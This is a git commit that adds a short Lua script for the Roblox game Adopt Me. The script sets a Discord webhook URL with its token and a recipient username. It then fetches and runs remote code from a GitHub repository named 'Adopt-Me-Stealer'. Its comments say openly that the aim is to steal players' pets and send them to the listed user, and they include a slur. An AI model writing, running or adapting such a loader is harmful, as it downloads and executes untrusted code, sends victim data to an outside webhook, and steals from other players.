697eff2a77fc420a869219c88e4b82b1dc0f7ca9
Splishyrat <splishybestsitee@gmail.com>
2024-06-03 14:46:15 +0800

    Create Hsoshsnndis.lua

---
+++ Hsoshsnndis.lua
@@ -0,0 +1,3 @@
+_G.Webhook = "https://discord.com/api/webhooks/1247078538201403392/vzRAyRrkr5YgOF3_xk5uEPnRtRLtybBI2iSxnd-nXSexa2VaMXgmUfY1GKscw9j_u7yH" -- your webhook IS NEEDED so u can join the player and steal all shit lol
+_G.Username = "vincepogi0297" -- this explains itself, for the retards, the user all the pets are going to
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kfc-Muncher-2000/Adopt-Me-Stealer/main/main.lua"))()
